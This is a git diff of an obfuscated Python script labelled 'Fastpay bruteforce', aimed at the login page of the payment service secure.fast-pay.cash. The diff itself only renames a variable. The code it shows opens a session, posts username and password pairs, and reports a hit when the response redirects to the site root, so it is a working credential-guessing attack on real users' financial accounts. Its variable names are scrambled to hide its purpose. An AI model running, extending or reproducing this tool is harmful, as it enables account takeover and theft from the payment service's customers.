@@ -4,8 +4,8 @@ from multiprocessing.dummy import Pool,Lock
 jojojojojojojojojojojjjjjojojoj = " -<>- Fastpay bruteforce - 2020/2021"
 
 def xjjqsijqjsi139239189121i9wi29wsi92i(xx9977112312s21212s, nqjisjiwqjijjsowksowkso02012):
-    linkaka = "https://secure.fast-pay.cash/"
-    tfxasqaz = linkaka + "login"
+    linkakaaqggq = "https://secure.fast-pay.cash/"
+    tfxasqaz = linkakaaqggq + "login"
     tfedwsqs = requests.Session()
     sijwijsiwj = tfedwsqs .get(tfxasqaz)
     xjisjiwjsiwijsi23uu12wusjujiqjsijwijs = sijwijsiwj.cookies.get_dict()
@@ -16,7 +16,7 @@ def xjjqsijqjsi139239189121i9wi29wsi92i(xx9977112312s21212s, nqjisjiwqjijjsowkso
     xkgaw = (" > [N:{}] and [P:{}] > Failed ").format(xx9977112312s21212s,nqjisjiwqjijjsowksowkso02012)
     jwsjjwisqjijsijqwiwjsiqsjwsqissjqisiqijsiqjjsijsi = {"User-Agent": "Mozilla/5.0 (Fastpay-Bruteforce) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
     xlxwowksokw = tfedwsqs.post(tfxasqaz, data=hswiqjsiwjiq9391821i29s9w2js91229191, headers=jwsjjwisqjijsijqwiwjsiqsjwsqissjqisiqijsiqjjsijsi, cookies=xjisjiwjsiwijsi23uu12wusjujiqjsijwijs)
-    if xlxwowksokw.url == linkaka:
+    if xlxwowksokw.url == linkakaaqggq:
         print(tfgaw)
     else:
         print(xkgaw)
